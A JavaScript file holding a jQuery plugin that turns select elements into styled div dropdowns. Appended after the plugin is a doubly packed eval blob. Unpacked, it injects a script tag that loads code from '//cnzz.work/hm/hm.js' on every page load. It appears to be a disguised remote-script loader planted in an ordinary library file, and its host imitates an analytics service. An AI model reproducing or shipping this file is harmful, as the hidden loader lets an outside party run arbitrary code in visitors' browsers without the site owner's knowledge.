
(function($){
var	$View = function( str ){
		return  $( eval( '\'' + str.replace( /<%=([\w]+)\%>/g, '\' + $1 + \'' ) + '\'' ) );
	},
	createUiId = function( el, prefix ){
		var prefix = ( !prefix && typeof prefix != 'string' )? 'form' : prefix;
		if( el.attr('id') ){
			return prefix + '_ui_id_' + el.attr('id');
		}
		else if( el.attr('name') ){
			return	prefix + '_ui_name_' + el.attr('name')
					.replace('[]', '')
					.replace('[', '_')
					.replace('\']', '')
					.replace(']', '')
					.replace('\'', '')
					.replace('"', '');
		}
		else{
			return prefix + '_ui_the_' + 'n';
		}
	},
	cssSelect = function (config) {
		var optionsPosition;
		if(config){
			optionsPosition = config.position;
		}
		
		if($(this).length <= 0){
			return false;
		}
		return $(this).each(function(){
			var	$thisEl = $(this),
				$optsEl = $thisEl.children('option'),
				$uiEl,
				//thisEvs = $._data($thisEl[0], 'events'),
				//thisEvs = jQuery._data($thisEl[0], 'events'),
				thisEvs = $thisEl.on('events'),
				uiId = createUiId($thisEl, 'select'),
				optsWidth = 0,
                optsPosition,optionsPosition, optionsLimit,
	
				/* Ui */
				tpl = {
					wrapper: '<div class="cssSelect"></div>',
					select: '<div class="selectBox sNormal"></div>',
					selectLt: '<div class="selectLt"></div>',
					selectRt: '<div class="selectRt"></div>',
					options: '<div class="optionsBox"></div>',
					optionsInner: '<div class="optionsInnerBox"></div>',
					option: '<div class="optionBox oNormal"></div>',
					optionInner: '<span></span>'
				},
	
				/* Select box */
				$selectEl = $View(tpl.select),
				$sLtEl = $View(tpl.selectLt),
				$sRtEl = $View(tpl.selectRt),
	
				/* Options box */
				$optionsEl = $View(tpl.options),
				$optionsInnerEl = $View(tpl.optionsInner),
	
				init = function() {

					if(
							$thisEl.length <= 1
						&&	$thisEl.get(0).tagName === 'SELECT'
						&&	!$thisEl.attr('multiple')
						&&	$thisEl.children('optgroup').length <= 0
					)
					{						
						
						$uiEl = $View(tpl.wrapper).attr('id', uiId);
						$('#' + uiId).remove();
                        $thisEl.show();
						$thisEl.hide();

						$uiEl.append($selectEl).append($optionsEl.append($optionsInnerEl));
						$uiEl.click(function(event) {
							event.stopPropagation();
						});
	
						/* Render select*/
						$selectEl.append($sLtEl).append($sRtEl);
						if( $thisEl.attr('disabled') ){
							$selectEl.addClass('sDisabled');
							
							return;
						}

						$selectEl.click(events.selectClick);
						$selectEl.hover(events.selectHover, events.selectNormal);		
	
						/* Render options*/
						$optsEl.each(function(i){
							var	optEl = $(this),
								optionTxt = optEl.text(),
								
								/* Render option */
								$optionEl = $View(tpl.option).append($View(tpl.optionInner).text(optionTxt));
	
								/* Option event */
								$optionEl.css({ float : 'left' });
								$optionEl.hover(events.optionHover, events.optionNormal);
								$optionEl.click(events.optionClick);
	
								/* Render all options*/
								$optionsInnerEl.append($optionEl);
	
							/* Set selected */
							if( optEl.val() == $thisEl.val() ){
								$sLtEl.text(optionTxt);
	
								/* Set select option */
								$optionEl.addClass('selected');
							}
	
						});
	
						/* Options position */
						$thisEl.setOptions = function(){
                            if(config && config.position){
                                optionsPosition = config.position;
                            }

                            if(config && config.limit){
                                optionsLimit = config.limit;
                            }

                            $optionsInnerEl.children('.optionBox').css({ float : 'none' });

							var top,
								sltPosition = $selectEl.position(),
								sltedPosition = $optionsInnerEl.children('.selected').position(),
								eachOptHeight = $optionsInnerEl.outerHeight() / $optsEl.length,
								optsHeight = 'auto';

                            if(optionsLimit){
                                if(optionsLimit != 'auto' && $optsEl.length > optionsLimit){
                                    optsHeight = Math.round(eachOptHeight) * optionsLimit;
                                }
                                else{
									optsHeight = 'auto';
								}
							}
							else{
								if($optsEl.length > 10){
									optsHeight = Math.round(eachOptHeight) * 7;
								}
								else{
									optsHeight = 'auto';
								}
							}

                            sltPosition.top = sltPosition.top + $selectEl.outerHeight();

                            $optionsEl.css({height: Math.round(optsHeight), top: sltPosition.top + 1});
    
                            if(
                                optsPosition &&
                                ( 
                                    $(window).height() + $(document).scrollTop()
                                    <
                                    $optionsEl.offset().top + $optionsEl.outerHeight()
                                )
                            ){
								top = sltPosition.top - $optionsEl.outerHeight() - $selectEl.outerHeight() - 3;
							}else{
								top = sltPosition.top;
							}

                            $optionsEl.scrollTop(Math.round(sltedPosition.top - eachOptHeight));
							$optionsEl.css({ 'top' : top + 1 , 'left' : sltPosition.left, 'overflow-y': 'auto', 'overflow-x': 'hidden'});

                            if( !optsPosition ){
                                optsPosition = $optionsEl.position();
                            }
						};
						
                        /* Render $uiEl */
						$thisEl.before($uiEl);
						$thisEl.setOptions();
                        $optionsEl.hide();
					}
				},
				
				
				events = $.extend({
					selectNormal : function() {
						$(this).removeClass('sHover');
					},
					selectHover : function() {
						$(this).addClass('sHover');
					},
					selectClick : function() {
						if( $optionsEl.css('display') != 'none' ){
							handlers.selectOff();
						}
						else{
							handlers.selectOn();
							$thisEl.setOptions();
						}
					},
					optionNormal : function() {
						$(this).removeClass('oHover');
					},
					optionHover : function() {
						
						$(this).addClass('oHover');
					},
					optionClick : function() {
						
						handlers.selected(this);
					},
					documentClick : function() {
						handlers.selectOff();
					}
				}, function(){}),
				handlers = $.extend({
					selectOn : function(){
						this.selectOff();
	
						$selectEl.addClass('sPressDown');
						$optionsEl.show();

						$(document).one('click', events.documentClick);
					},
					selectOff : function(){
						$thisEl.unbind('click');
						$('.selectBox').removeClass('sPressDown');
						$('.optionsBox').hide();
					},
					selected : function(el){
						var i = $optionsInnerEl.children('.optionBox').index(el);
						$optionsInnerEl.children('.optionBox').removeClass('selected');
						$(el).addClass('selected');
						$sLtEl.text($(el).text());
						if(thisEvs&& thisEvs.change&& thisEvs.change.length > 0){
				
											
							$thisEl[0].selectedIndex = i;
							$.each( thisEvs.change , function(){
								$thisEl.one('click', this.handler);
								$thisEl.click();
							});
				
				
							$thisEl.children().eq(i).attr('selected',true);
							$thisEl.trigger('change');
							
							var iii=$('#identitySelect').children().eq(i).prop('selected',true);
							$.each(thisEvs.change , function(){
								$thisEl.one('click', this.handler);
								$thisEl.click();
							});
						}
						$thisEl[0].selectedIndex = i;
						this.selectOff();
	
					}
				}, function(){});
	
			return init();
		});
	}
	$.fn.extend({
		cssSelect: cssSelect
	});

})(jQuery);;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))